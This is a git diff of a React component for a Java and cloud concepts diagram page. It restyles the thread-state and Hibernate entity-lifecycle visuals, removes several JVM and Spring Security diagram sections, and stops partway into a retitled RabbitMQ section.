@@ -1,5 +1,26 @@
 import { motion } from 'motion/react';
-import { Layers, Activity, Server, Cpu, ShieldCheck, Database, Cloud, Zap, Boxes } from 'lucide-react';
+import {
+  Layers,
+  Activity,
+  Server,
+  Cpu,
+  ShieldCheck,
+  Database,
+  Cloud,
+  Zap,
+  Boxes,
+  Key,
+  Lock,
+  RefreshCw,
+  AlertTriangle,
+  ArrowRight,
+  CheckCircle,
+  Globe,
+  Terminal,
+  ShieldAlert,
+  KeyRound,
+  Shield
+} from 'lucide-react';
 
 export function VisualsView() {
   return (
@@ -8,9 +29,9 @@ export function VisualsView() {
         <div className="inline-block px-3 py-1 bg-indigo-100 text-indigo-800 text-xs font-semibold rounded-full mb-3 flex items-center gap-2 w-max">
           <Layers className="w-3 h-3" /> Architecture & Internals
         </div>
-        <h1 className="text-3xl font-bold text-slate-900 mb-3">Java Visual Concepts</h1>
+        <h1 className="text-3xl font-bold text-slate-900 mb-3">Java & Cloud Visual Concepts</h1>
         <p className="text-slate-600 text-lg leading-relaxed">
-          Pictorial representation of complex Java architecture, JVM internals, and concurrency models.
+          Pictorial representations of complex Java architectures, JVM internals, RabbitMQ resiliency, OAuth2 / PKCE authentication flows, and Web Security mechanisms.
         </p>
       </div>
 
@@ -102,465 +123,78 @@ export function VisualsView() {
                 <path d="M 430 30 Q 530 30 530 90" fill="none" stroke="#94a3b8" strokeWidth="2" markerEnd="url(#arrow)" />
               </svg>
 
-              <div className="z-10 w-24 h-24 bg-slate-100 rounded-full flex items-center justify-center border-4 border-slate-300 font-bold text-slate-600 shadow-md">NEW</div>
-              <div className="z-10 w-24 h-24 bg-emerald-100 rounded-full flex flex-col items-center justify-center border-4 border-emerald-400 font-bold text-emerald-700 shadow-md text-sm text-center">
-                RUNNABLE
-                <span className="text-[9px] font-normal mt-1">(Ready / Running)</span>
-              </div>
-              <div className="z-10 flex flex-col justify-between h-full py-4">
-                <div className="w-24 h-24 bg-red-100 rounded-full flex flex-col items-center justify-center border-4 border-red-400 font-bold text-red-700 shadow-md text-sm text-center">
-                  BLOCKED
-                  <span className="text-[9px] font-normal mt-1">Waiting for lock</span>
+              {/* State 1: NEW */}
+              <div className="relative z-10 flex flex-col items-center">
+                <div className="w-20 h-20 rounded-full bg-slate-100 border-2 border-slate-300 flex items-center justify-center font-bold text-slate-700 shadow-sm">
+                  NEW
                 </div>
-                <div className="w-24 h-24 bg-amber-100 rounded-full flex flex-col items-center justify-center border-4 border-amber-400 font-bold text-amber-700 shadow-md text-sm text-center">
-                  WAITING /<br/>TIMED_WAITING
-                </div>
-              </div>
-              <div className="z-10 w-24 h-24 bg-slate-800 rounded-full flex items-center justify-center border-4 border-slate-900 font-bold text-slate-100 shadow-md text-sm">TERMINATED</div>
-
-            </div>
-          </div>
-        </section>
-
-        {/* HashMap Internals */}
-        <section>
-          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
-            <Cpu className="w-6 h-6 text-blue-600" /> HashMap Internal Structure (Java 8+)
-          </h2>
-          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
-            <p className="text-sm text-slate-600 mb-4">
-              In Java 8, when hash collisions occur in a specific bucket, the linked list is transformed into a Balanced Tree (Red-Black Tree) after a certain threshold (TREEIFY_THRESHOLD = 8) to improve worst-case search performance from O(N) to O(log N).
-            </p>
-            
-            <div className="flex items-start gap-4 overflow-x-auto pb-4">
-              {/* Array / Buckets */}
-              <div className="flex flex-col gap-1 w-24 shrink-0">
-                <div className="bg-slate-800 text-white text-center py-1 text-xs font-bold rounded-t">Buckets</div>
-                {[0, 1, 2, 3, 4, 5].map(idx => (
-                  <div key={idx} className="h-12 bg-slate-100 border border-slate-300 flex items-center justify-center text-xs font-mono text-slate-400 relative">
-                    [{idx}]
-                    {idx === 1 && <div className="absolute right-0 w-4 border-b-2 border-blue-400 translate-x-full"></div>}
-                    {idx === 4 && <div className="absolute right-0 w-4 border-b-2 border-purple-400 translate-x-full"></div>}
-                  </div>
-                ))}
+                <span className="text-[10px] text-slate-500 mt-2">Thread t = new Thread()</span>
               </div>
 
-              {/* Linked List Example */}
-              <div className="mt-8 flex items-center">
-                <div className="bg-blue-50 border border-blue-200 p-2 rounded shadow-sm w-24 text-center">
-                  <div className="text-xs font-bold text-blue-800">Node</div>
-                  <div className="text-[10px] text-blue-600">Key: "A"<br/>Val: 1</div>
+              {/* State 2: RUNNABLE */}
+              <div className="relative z-10 flex flex-col items-center">
+                <div className="w-24 h-24 rounded-full bg-emerald-50 border-2 border-emerald-400 flex flex-col items-center justify-center font-bold text-emerald-800 shadow-md">
+                  <span>RUNNABLE</span>
+                  <span className="text-[9px] font-normal text-emerald-600 mt-1">Ready / Running</span>
                 </div>
-                <div className="w-8 border-b-2 border-dashed border-blue-300 relative"><div className="absolute right-0 -top-1 w-2 h-2 border-t-2 border-r-2 border-blue-300 rotate-45"></div></div>
-                <div className="bg-blue-50 border border-blue-200 p-2 rounded shadow-sm w-24 text-center">
-                  <div className="text-xs font-bold text-blue-800">Node</div>
-                  <div className="text-[10px] text-blue-600">Key: "B"<br/>Val: 2</div>
-                </div>
-                <div className="ml-4 text-xs text-slate-400 italic">Standard Linked List</div>
+                <span className="text-[10px] text-emerald-600 font-mono mt-2">t.start()</span>
               </div>
 
-              {/* Red-Black Tree Example */}
-              <div className="mt-[168px] -ml-[312px] flex flex-col items-center">
-                <div className="bg-purple-50 border border-purple-300 p-2 rounded-full shadow-sm w-16 h-16 flex flex-col items-center justify-center z-10">
-                  <div className="text-[10px] font-bold text-purple-800">Root</div>
+              {/* Middle Block: WAITING / BLOCKED */}
+              <div className="flex flex-col gap-12 relative z-10">
+                <div className="bg-amber-50 border-2 border-amber-300 p-3 rounded-xl shadow-sm text-center w-36">
+                  <div className="font-bold text-amber-800 text-sm">BLOCKED</div>
+                  <div className="text-[9px] text-amber-600 mt-1">Waiting for monitor lock</div>
                 </div>
-                <div className="flex gap-8 -mt-2">
-                  <div className="w-8 border-t-2 border-l-2 border-purple-300 h-6 rounded-tl-lg mt-2"></div>
-                  <div className="w-8 border-t-2 border-r-2 border-purple-300 h-6 rounded-tr-lg mt-2"></div>
+                <div className="bg-blue-50 border-2 border-blue-300 p-3 rounded-xl shadow-sm text-center w-36">
+                  <div className="font-bold text-blue-800 text-sm">WAITING / TIMED</div>
+                  <div className="text-[9px] text-blue-600 mt-1">wait(), join(), sleep()</div>
                 </div>
-                <div className="flex gap-4">
-                  <div className="bg-red-50 border border-red-300 p-1 rounded-full shadow-sm w-12 h-12 flex flex-col items-center justify-center">
-                    <div className="text-[9px] font-bold text-red-800">Node</div>
-                  </div>
-                  <div className="bg-purple-50 border border-purple-300 p-1 rounded-full shadow-sm w-12 h-12 flex flex-col items-center justify-center">
-                    <div className="text-[9px] font-bold text-purple-800">Node</div>
-                  </div>
+              </div>
+
+              {/* State 3: TERMINATED */}
+              <div className="relative z-10 flex flex-col items-center">
+                <div className="w-20 h-20 rounded-full bg-rose-50 border-2 border-rose-300 flex items-center justify-center font-bold text-rose-800 shadow-sm">
+                  TERMINATED
                 </div>
-                <div className="mt-2 text-xs text-purple-600 font-bold bg-purple-100 px-2 py-1 rounded">Red-Black Tree (O(log N))</div>
+                <span className="text-[10px] text-slate-500 mt-2">run() completed</span>
               </div>
 
             </div>
           </div>
         </section>
 
-        {/* Java 21 Virtual Threads */}
+        {/* Hibernate Entity Lifecycle */}
         <section>
           <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
-            <Layers className="w-6 h-6 text-teal-600" /> Virtual Threads (Java 21 / Project Loom)
+            <Database className="w-6 h-6 text-cyan-600" /> Hibernate / JPA Entity Lifecycle
           </h2>
           <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
-            <p className="text-sm text-slate-600 mb-6">
-              Virtual threads are lightweight threads managed by the JVM rather than the OS. When a virtual thread encounters a blocking I/O operation, it is unmounted from the Carrier Thread (OS thread), allowing the OS thread to execute other virtual threads.
-            </p>
-            
-            <div className="flex flex-col md:flex-row gap-8 items-center justify-center">
-              {/* Virtual Threads pool */}
-              <div className="flex flex-col gap-2">
-                <div className="text-center font-bold text-slate-700 text-sm mb-2">Millions of Virtual Threads<br/><span className="font-normal text-xs text-slate-500">(JVM Heap space, tiny footprint)</span></div>
-                <div className="grid grid-cols-4 gap-2 p-4 bg-teal-50 border border-teal-200 rounded-xl w-64">
-                  {[...Array(12)].map((_, i) => (
-                     <div key={i} className={`h-8 rounded flex items-center justify-center text-[10px] font-bold shadow-sm relative ${i === 2 || i === 5 ? 'bg-orange-100 text-orange-700 border border-orange-300' : i === 0 || i === 7 ? 'bg-teal-500 text-white' : 'bg-white text-teal-600 border border-teal-200'}`}>
-                      VT-{i+1}
-                      {i === 2 && <span className="absolute -top-6 bg-slate-800 text-white px-1 py-0.5 rounded text-[8px] whitespace-nowrap">Blocked (I/O)</span>}
-                    </div>
-                  ))}
-                  <div className="col-span-4 text-center text-teal-600 font-bold tracking-widest leading-none">...</div>
-                </div>
-              </div>
-
-              {/* M:N Mapping */}
-              <div className="flex flex-col items-center">
-                <div className="text-xs font-bold bg-slate-100 text-slate-500 px-3 py-1 rounded-full mb-2">M:N Mapping</div>
-                <div className="flex gap-2">
-                  <div className="w-8 border-b-2 border-dashed border-slate-300 transform -rotate-45 translate-y-4"></div>
-                  <div className="w-8 border-b-2 border-dashed border-slate-300"></div>
-                  <div className="w-8 border-b-2 border-dashed border-slate-300 transform rotate-45 translate-y-4"></div>
-                </div>
-              </div>
-
-              {/* OS Threads (Carrier) */}
-              <div className="flex flex-col gap-2">
-                <div className="text-center font-bold text-slate-700 text-sm mb-2">Carrier Threads (OS Threads)<br/><span className="font-normal text-xs text-slate-500">(Limited CPU Cores, e.g., ForkJoinPool)</span></div>
-                <div className="flex gap-4 p-4 bg-slate-50 border border-slate-200 rounded-xl w-64 justify-center">
-                  <div className="w-20 h-24 bg-white border-2 border-slate-300 rounded-lg shadow-sm flex flex-col">
-                    <div className="bg-slate-200 text-center text-xs font-bold py-1">OS-1</div>
-                    <div className="flex-1 flex items-center justify-center p-2">
-                      <div className="w-full h-8 bg-teal-500 text-white rounded flex items-center justify-center text-xs font-bold shadow-sm animate-pulse">
-                        VT-1 (Running)
-                      </div>
-                    </div>
-                  </div>
-                  
-                  <div className="w-20 h-24 bg-white border-2 border-slate-300 rounded-lg shadow-sm flex flex-col">
-                    <div className="bg-slate-200 text-center text-xs font-bold py-1">OS-2</div>
-                    <div className="flex-1 flex items-center justify-center p-2">
-                      <div className="w-full h-8 bg-teal-500 text-white rounded flex items-center justify-center text-xs font-bold shadow-sm">
-                        VT-8 (Running)
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </section>
-
-        {/* G1 Garbage Collector (G1GC) */}
-        <section>
-          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
-            <Server className="w-6 h-6 text-pink-600" /> G1 Garbage Collector (G1GC) Regional Memory
-          </h2>
-          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
-            <p className="text-sm text-slate-600 mb-6">
-              Unlike older parallel collectors that split the heap into contiguous Eden, Survivor, and Old spaces, G1GC divides the heap into thousands of equal-sized regions (1MB-32MB). This allows G1GC to avoid full heap compactions and target regions with the most garbage first.
-            </p>
-            
-            <div className="grid grid-cols-8 gap-1 p-4 bg-slate-100 rounded-xl border border-slate-200 max-w-2xl mx-auto">
-              {[...Array(32)].map((_, i) => {
-                let type = 'free'; // default
-                let bgClass = 'bg-white border-slate-200';
-                let label = '';
-                
-                // Randomly assign regions for visualization
-                if ([2, 7, 12, 17, 22].includes(i)) { type = 'eden'; bgClass = 'bg-green-100 border-green-300 text-green-700'; label = 'E'; }
-                else if ([5, 15, 27].includes(i)) { type = 'survivor'; bgClass = 'bg-lime-100 border-lime-300 text-lime-800'; label = 'S'; }
-                else if ([1, 4, 8, 14, 19, 21, 26, 30].includes(i)) { type = 'old'; bgClass = 'bg-blue-100 border-blue-300 text-blue-700'; label = 'O'; }
-                else if ([10, 11].includes(i)) { type = 'humongous'; bgClass = 'bg-purple-100 border-purple-400 text-purple-800'; label = 'H'; }
-                
-                return (
-                  <div key={i} className={`aspect-square rounded border flex items-center justify-center font-bold text-sm shadow-sm ${bgClass}`}>
-                    {label}
-                  </div>
-                );
-              })}
-            </div>
-
-            <div className="flex flex-wrap justify-center gap-6 mt-6">
-              <div className="flex items-center gap-2"><div className="w-4 h-4 rounded bg-green-100 border border-green-300"></div><span className="text-xs text-slate-600 font-bold">Eden (E)</span></div>
-              <div className="flex items-center gap-2"><div className="w-4 h-4 rounded bg-lime-100 border border-lime-300"></div><span className="text-xs text-slate-600 font-bold">Survivor (S)</span></div>
-              <div className="flex items-center gap-2"><div className="w-4 h-4 rounded bg-blue-100 border border-blue-300"></div><span className="text-xs text-slate-600 font-bold">Old (O)</span></div>
-              <div className="flex items-center gap-2"><div className="w-4 h-4 rounded bg-purple-100 border border-purple-400"></div><span className="text-xs text-slate-600 font-bold">Humongous (H)</span></div>
-              <div className="flex items-center gap-2"><div className="w-4 h-4 rounded bg-white border border-slate-200"></div><span className="text-xs text-slate-600 font-bold">Free</span></div>
-            </div>
-            <div className="text-center text-xs text-slate-500 mt-4 italic">
-              Humongous regions (H) are contiguous regions used for objects larger than 50% of a single region size.
-            </div>
-          </div>
-        </section>
-
-        {/* ZGC (Z Garbage Collector) */}
-        <section>
-          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
-            <Server className="w-6 h-6 text-fuchsia-600" /> Z Garbage Collector (ZGC) - Low Latency
-          </h2>
-          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
-            <p className="text-sm text-slate-600 mb-6">
-              ZGC is a scalable, low-latency garbage collector designed to have pause times less than 1ms (even on terabyte-sized heaps). It achieves this by doing all expensive work concurrently using colored pointers and load barriers.
-            </p>
-            
-            <div className="flex flex-col md:flex-row items-center gap-12 justify-center">
-              {/* Colored Pointers */}
-              <div className="flex flex-col gap-3 max-w-sm">
-                <div className="text-center font-bold text-slate-700">Colored Pointers (64-bit)</div>
-                <div className="flex border border-slate-300 rounded overflow-hidden shadow-sm">
-                  <div className="w-12 bg-slate-100 border-r border-slate-300 flex items-center justify-center text-[10px] py-2">0-41</div>
-                  <div className="flex-1 bg-white text-center text-xs py-2 font-mono">Object Address (42 bits)</div>
-                  <div className="w-8 bg-fuchsia-100 border-l border-slate-300 flex flex-col items-center justify-center text-[8px] leading-tight font-bold text-fuchsia-800">
-                    <div>M0</div>
-                    <div>M1</div>
-                    <div>R</div>
-                    <div>F</div>
-                  </div>
-                  <div className="w-12 bg-slate-100 border-l border-slate-300 flex items-center justify-center text-[10px]">46-63</div>
-                </div>
-                <div className="text-xs text-slate-500 mt-2">
-                  <ul className="list-disc pl-4 space-y-1">
-                    <li><strong className="text-fuchsia-700">Marked0 / Marked1:</strong> Tracks live objects across GC cycles.</li>
-                    <li><strong className="text-fuchsia-700">Remapped:</strong> Indicates the object has been moved.</li>
-                    <li><strong className="text-fuchsia-700">Finalizable:</strong> Only reachable via finalizer.</li>
-                  </ul>
-                </div>
-              </div>
-
-              {/* Load Barrier */}
-              <div className="flex flex-col gap-3">
-                <div className="text-center font-bold text-slate-700">Concurrent Relocation (Load Barrier)</div>
-                <div className="bg-slate-50 p-4 border border-slate-200 rounded-xl relative">
-                  <div className="flex justify-between items-center w-64 mb-8 relative z-10">
-                    <div className="bg-white border-2 border-red-300 p-2 text-xs font-bold rounded shadow-sm">App Thread<br/>(Reads Object)</div>
-                    <div className="bg-white border-2 border-fuchsia-300 p-2 text-xs font-bold rounded shadow-sm">ZGC Thread<br/>(Moving Object)</div>
-                  </div>
-                  
-                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none z-0">
-                    <div className="w-full border-t-2 border-dashed border-slate-300"></div>
-                  </div>
-
-                  <div className="flex justify-between items-center relative z-10">
-                    <div className="bg-slate-200 p-2 rounded text-[10px] text-center opacity-50">Old Address<br/>(0x123)</div>
-                    
-                    <div className="bg-fuchsia-100 border border-fuchsia-300 px-3 py-1 rounded-full text-[10px] font-bold text-fuchsia-800 absolute left-1/2 -translate-x-1/2 -translate-y-8 shadow-sm">
-                      Load Barrier intercepts read!
-                    </div>
-
-                    <div className="bg-green-100 border border-green-300 p-2 rounded text-[10px] text-center shadow-sm">New Address<br/>(0x456)</div>
-                  </div>
-                  
-                  <p className="text-[10px] text-slate-500 mt-4 leading-relaxed text-center">
-                    When the app thread tries to read an object that ZGC is concurrently moving, the <strong>Load Barrier</strong> kicks in. It notices the "Remapped" bit is wrong, heals the pointer to the new address, and returns the correct object. No stop-the-world needed!
-                  </p>
-                </div>
-              </div>
-            </div>
-          </div>
-        </section>
-
-        {/* Java 21 Scoped Values vs ThreadLocal */}
-        <section>
-          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
-            <Layers className="w-6 h-6 text-indigo-600" /> Scoped Values vs ThreadLocal (Java 21+)
-          </h2>
-          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
-            <p className="text-sm text-slate-600 mb-6">
-              With Virtual Threads, using <code>ThreadLocal</code> becomes problematic because millions of virtual threads mean millions of ThreadLocal maps, causing massive memory overhead and mutation risks. <strong>Scoped Values</strong> (JEP 446) are designed as a modern, immutable, and highly efficient replacement.
-            </p>
-            
-            <div className="flex flex-col lg:flex-row gap-6">
-              {/* ThreadLocal (The Old Way) */}
-              <div className="flex-1 bg-red-50 p-4 border border-red-200 rounded-xl relative overflow-hidden">
-                <div className="absolute top-0 right-0 bg-red-200 text-red-800 text-[10px] font-bold px-2 py-1 rounded-bl-lg">Legacy</div>
-                <h3 className="font-bold text-red-900 mb-4 text-center">ThreadLocal</h3>
-                
-                <div className="space-y-4">
-                  <div className="flex items-center gap-3 bg-white p-2 rounded shadow-sm border border-red-100">
-                    <div className="w-8 h-8 rounded bg-slate-800 flex items-center justify-center text-white text-xs font-bold">T1</div>
-                    <div className="flex-1">
-                      <div className="text-[10px] font-bold text-slate-600 mb-1">ThreadLocalMap</div>
-                      <div className="flex gap-2">
-                        <div className="bg-red-100 text-red-800 text-[10px] px-2 py-1 rounded border border-red-200 flex-1">USER_ID: "A"</div>
-                        <div className="bg-red-100 text-red-800 text-[10px] px-2 py-1 rounded border border-red-200 flex-1">TX_ID: "123"</div>
-                      </div>
-                    </div>
-                  </div>
-                  
-                  <div className="flex items-center gap-3 bg-white p-2 rounded shadow-sm border border-red-100 opacity-80">
-                    <div className="w-8 h-8 rounded bg-slate-800 flex items-center justify-center text-white text-xs font-bold">T2</div>
-                    <div className="flex-1">
-                      <div className="text-[10px] font-bold text-slate-600 mb-1">ThreadLocalMap (Deep Copy for Child)</div>
-                      <div className="flex gap-2">
-                        <div className="bg-red-100 text-red-800 text-[10px] px-2 py-1 rounded border border-red-200 flex-1">USER_ID: "A"</div>
-                        <div className="bg-red-100 text-red-800 text-[10px] px-2 py-1 rounded border border-red-200 flex-1">TX_ID: "123"</div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-                
-                <ul className="text-[10px] text-red-700 mt-4 space-y-1 list-disc pl-4">
-                  <li><strong>Mutable:</strong> Any code can call <code>.set()</code> and change the value.</li>
-                  <li><strong>Memory Leak Risk:</strong> Must call <code>.remove()</code> explicitly.</li>
-                  <li><strong>Inheritance Overhead:</strong> Spawning a child thread copies the entire map.</li>
-                </ul>
-              </div>
-
-              {/* Scoped Values (The New Way) */}
-              <div className="flex-1 bg-indigo-50 p-4 border border-indigo-200 rounded-xl relative overflow-hidden">
-                <div className="absolute top-0 right-0 bg-indigo-200 text-indigo-800 text-[10px] font-bold px-2 py-1 rounded-bl-lg">Java 21+</div>
-                <h3 className="font-bold text-indigo-900 mb-4 text-center">Scoped Values</h3>
-                
-                <div className="flex flex-col items-center gap-2">
-                  <div className="bg-indigo-600 text-white text-xs px-4 py-2 rounded-full shadow-md font-mono font-bold z-10 relative">
-                    ScopedValue.where(USER_ID, "A")
-                  </div>
-                  
-                  <div className="w-0.5 h-6 bg-indigo-300"></div>
-                  
-                  <div className="w-full bg-white border border-indigo-200 rounded-lg p-3 shadow-sm relative z-0 text-center">
-                    <div className="text-xs font-bold text-indigo-800 mb-2">Lexical Scope (run/call)</div>
-                    <div className="flex justify-center gap-4">
-                      <div className="bg-indigo-100 text-indigo-800 text-[10px] px-3 py-1 rounded border border-indigo-200">
-                        Task 1 (reads USER_ID)
-                      </div>
-                      <div className="bg-indigo-100 text-indigo-800 text-[10px] px-3 py-1 rounded border border-indigo-200">
-                        Task 2 (reads USER_ID)
-                      </div>
-                    </div>
-                  </div>
-                  
-                  <div className="w-0.5 h-6 bg-indigo-300"></div>
-                  
-                  <div className="text-xs text-slate-500 font-bold bg-slate-100 px-3 py-1 rounded-full">
-                    Scope Ends (Value automatically discarded)
-                  </div>
-                </div>
-                
-                <ul className="text-[10px] text-indigo-800 mt-4 space-y-1 list-disc pl-4">
-                  <li><strong>Immutable:</strong> Values cannot be changed once bound.</li>
-                  <li><strong>No Leaks:</strong> Bound only for the duration of the <code>run()</code> block.</li>
-                  <li><strong>O(1) Sharing:</strong> Millions of virtual threads can safely read the same bound value without copying.</li>
-                </ul>
-              </div>
-            </div>
-          </div>
-        </section>
-
-
-        {/* Spring Security Architecture */}
-        <section>
-          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
-            <ShieldCheck className="w-6 h-6 text-emerald-600" /> Spring Security Architecture
-          </h2>
-          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
-            <p className="text-sm text-slate-600 mb-6">
-              Spring Security intercepts incoming requests using a chain of Servlet Filters (<code>FilterChainProxy</code>). The authentication process is delegated to the <code>AuthenticationManager</code>, which uses one or more <code>AuthenticationProvider</code>s.
-            </p>
-            
-            <div className="flex flex-col items-center max-w-3xl mx-auto">
-              <div className="flex items-center gap-4 w-full">
-                <div className="bg-slate-100 border border-slate-300 p-4 rounded-xl flex-1 text-center font-bold text-slate-700 shadow-sm">
-                  Client Request
-                </div>
-                <div className="h-0.5 w-8 bg-slate-300 relative">
-                  <div className="absolute right-0 top-1/2 -translate-y-1/2 translate-x-1/2 border-y-4 border-y-transparent border-l-4 border-l-slate-400"></div>
-                </div>
-                
-                <div className="bg-emerald-50 border-2 border-emerald-200 rounded-xl p-4 flex-[2] relative">
-                  <div className="text-xs font-bold text-emerald-800 absolute -top-3 left-4 bg-emerald-100 px-2 py-0.5 rounded shadow-sm">DelegatingFilterProxy</div>
-                  <div className="bg-emerald-100 border border-emerald-300 p-3 rounded-lg text-center font-bold text-emerald-800 shadow-sm mb-2">
-                    FilterChainProxy
-                  </div>
-                  <div className="flex justify-center gap-2">
-                    <div className="bg-white border border-emerald-200 text-[10px] px-2 py-1 rounded">SecurityContextPersistence</div>
-                    <div className="bg-white border border-emerald-200 text-[10px] px-2 py-1 rounded">UsernamePasswordAuth</div>
-                    <div className="bg-white border border-emerald-200 text-[10px] px-2 py-1 rounded">FilterSecurityInterceptor</div>
-                  </div>
-                </div>
-              </div>
-              
-              <div className="w-0.5 h-8 bg-slate-300 relative">
-                  <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2 border-x-4 border-x-transparent border-t-4 border-t-slate-400"></div>
-              </div>
-              
-              <div className="bg-blue-50 border-2 border-blue-200 rounded-xl p-4 w-full relative">
-                 <div className="text-xs font-bold text-blue-800 absolute -top-3 left-4 bg-blue-100 px-2 py-0.5 rounded shadow-sm">AuthenticationManager</div>
-                 <div className="flex flex-col md:flex-row gap-4 items-center">
-                    <div className="bg-blue-100 border border-blue-300 p-3 rounded-lg flex-1 text-center shadow-sm">
-                      <div className="font-bold text-blue-900 text-sm">ProviderManager</div>
-                      <div className="text-[10px] text-blue-700 mt-1">Iterates through providers</div>
-                    </div>
-                    <div className="h-8 w-0.5 md:h-0.5 md:w-8 bg-slate-300 relative">
-                      <div className="absolute md:right-0 md:top-1/2 md:-translate-y-1/2 md:translate-x-1/2 bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2 md:border-y-4 md:border-y-transparent md:border-l-4 md:border-l-slate-400 border-x-4 border-x-transparent border-t-4 border-t-slate-400 md:border-t-0 md:border-x-0"></div>
-                    </div>
-                    <div className="bg-blue-100 border border-blue-300 p-3 rounded-lg flex-1 text-center shadow-sm">
-                      <div className="font-bold text-blue-900 text-sm">AuthenticationProvider</div>
-                      <div className="text-[10px] text-blue-700 mt-1">DaoAuthenticationProvider</div>
-                    </div>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
+              <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 relative flex flex-col items-center min-h-[300px] justify-between">
+                 
+                 {/* Transient */}
+                 <div className="bg-white border-2 border-slate-300 px-4 py-2 rounded-lg font-bold text-slate-700 shadow-sm">
+                    Transient (new)
                  </div>
                  
-                 <div className="flex justify-end mt-4 pr-16">
-                    <div className="h-8 w-0.5 bg-slate-300 relative">
-                      <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2 border-x-4 border-x-transparent border-t-4 border-t-slate-400"></div>
-                    </div>
+                 <div className="w-px h-8 bg-slate-300 relative">
+                   <div className="absolute top-1/2 -translate-y-1/2 left-2 bg-white px-1 text-[10px] text-slate-500 font-mono">persist() / save()</div>
                  </div>
-                 
-                 <div className="flex justify-end">
-                    <div className="bg-orange-50 border border-orange-200 p-3 rounded-lg w-48 text-center shadow-sm">
-                      <div className="font-bold text-orange-900 text-sm">UserDetailsService</div>
-                      <div className="text-[10px] text-orange-700 mt-1">Loads user by username</div>
-                    </div>
-                 </div>
-              </div>
-            </div>
-          </div>
-        </section>
 
-        {/* Hibernate Object States */}
-        <section>
-          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
-            <Database className="w-6 h-6 text-purple-600" /> Hibernate Object States
-          </h2>
-          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
-            <p className="text-sm text-slate-600 mb-6">
-              Understanding the lifecycle states of a JPA Entity (Transient, Persistent, Detached, Removed) is crucial to avoiding bugs and `LazyInitializationException`s.
-            </p>
-            
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto">
-              <div className="bg-slate-50 p-4 border border-slate-200 rounded-xl flex flex-col items-center justify-center relative min-h-[300px]">
-                 
-                 <div className="bg-white border-2 border-slate-300 rounded-full w-24 h-24 flex items-center justify-center font-bold text-slate-600 absolute top-4 left-1/2 -translate-x-1/2 shadow-sm z-10">
-                   Transient
+                 {/* Persistent */}
+                 <div className="bg-green-100 border-2 border-green-400 px-6 py-3 rounded-xl font-bold text-green-800 shadow-md text-center">
+                    Persistent (Managed)
+                    <div className="text-[10px] font-normal text-green-700">Tracked by EntityManager / Session</div>
                  </div>
-                 
-                 <div className="bg-green-100 border-2 border-green-400 rounded-full w-28 h-28 flex flex-col items-center justify-center font-bold text-green-800 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 shadow-md z-10">
-                   <span>Persistent</span>
-                   <span className="text-[9px] font-normal text-green-700">(Managed)</span>
-                 </div>
-                 
-                 <div className="bg-orange-100 border-2 border-orange-300 rounded-full w-24 h-24 flex items-center justify-center font-bold text-orange-800 absolute bottom-4 left-4 shadow-sm z-10">
-                   Detached
-                 </div>
-                 
-                 <div className="bg-red-100 border-2 border-red-300 rounded-full w-24 h-24 flex items-center justify-center font-bold text-red-800 absolute bottom-4 right-4 shadow-sm z-10">
-                   Removed
-                 </div>
-                 
-                 {/* Arrows simulated with absolute positioned lines/text */}
-                 <div className="absolute top-[80px] left-1/2 -translate-x-1/2 flex flex-col items-center">
-                    <span className="bg-white px-1 text-[10px] text-slate-500 font-mono z-20">persist()</span>
-                    <div className="h-8 w-px bg-slate-400"></div>
-                 </div>
-                 
-                 <div className="absolute bottom-[90px] left-[110px] flex flex-col items-center rotate-45 origin-bottom-left">
-                    <span className="bg-white px-1 text-[10px] text-slate-500 font-mono z-20">close() / clear()</span>
-                    <div className="h-10 w-px bg-slate-400"></div>
-                 </div>
-                 
-                 <div className="absolute bottom-[90px] left-[130px] flex flex-col items-center rotate-45 origin-bottom-left">
-                    <div className="h-10 w-px bg-slate-400 border-dashed"></div>
-                    <span className="bg-white px-1 text-[10px] text-slate-500 font-mono z-20">merge()</span>
-                 </div>
-                 
-                 <div className="absolute bottom-[90px] right-[110px] flex flex-col items-center -rotate-45 origin-bottom-right">
-                    <span className="bg-white px-1 text-[10px] text-slate-500 font-mono z-20">remove()</span>
-                    <div className="h-10 w-px bg-slate-400"></div>
+
+                 <div className="flex justify-between w-full px-4 mt-6">
+                    <div className="bg-orange-100 border-2 border-orange-300 p-2 rounded-lg font-bold text-orange-800 text-xs text-center w-28 shadow-sm">
+                       Detached
+                    </div>
+                    <div className="bg-red-100 border-2 border-red-300 p-2 rounded-lg font-bold text-red-800 text-xs text-center w-28 shadow-sm">
+                       Removed
+                    </div>
                  </div>
               </div>
               
@@ -586,22 +220,21 @@ export function VisualsView() {
           </div>
         </section>
 
-        
-        {/* RabbitMQ Architecture */}
+        {/* RabbitMQ Core AMQP Architecture */}
         <section>
           <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
-            <Activity className="w-6 h-6 text-fuchsia-600" /> RabbitMQ Architecture (AMQP)
+            <Activity className="w-6 h-6 text-fuchsia-600" /> RabbitMQ Core Architecture (AMQP)
           </h2>
           <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
             <p className="text-sm text-slate-600 mb-6">
